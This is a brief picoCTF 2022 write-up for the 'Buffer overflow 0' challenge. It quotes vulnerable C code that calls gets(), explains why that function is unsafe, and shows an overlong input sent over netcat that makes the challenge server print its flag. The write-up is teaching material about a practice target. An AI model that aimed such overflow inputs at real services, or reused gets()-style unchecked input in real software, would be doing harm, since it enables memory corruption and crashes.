---
title: "pico22/pwn: Buffer overflow 0"
date: 2022-04-05 12:16:08
tags:
- ctf
- pico22
- pwn
description: "Writeup for the picoCTF 2022 pwn challenge [Buffer overflow 0]."
permalink: ctfs/pico22/pwn/buffer-overflow-0/
---
## 📜 Description
Smash the stack \
Let's start off simple, can you overflow the correct buffer? The program is available  [here](https://artifacts.picoctf.net/c/523/vuln). You can view source  [here](https://artifacts.picoctf.net/c/523/vuln.c). And connect with it using:`nc saturn.picoctf.net 64712`

---

## 🔍 Detailed Solution
Let's analyze this `.c` file we have as reference.
```c
printf("Input: ");
fflush(stdout);
char buf1[100];
gets(buf1);
vuln(buf1);
printf("The program will exit now\n");
return 0;
```
We see that the `gets()` function is called. This function is really, really bad (in addition to being deprecated) as it will write the user's input to the stack without regard to its length, meaning a user's input can exceed its allocated space. We should be able to trigger the flag print by simply inputting a string that is longer than the specified length of 16 in the `vuln` function:
```
# nc saturn.picoctf.net 64712
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_********}
```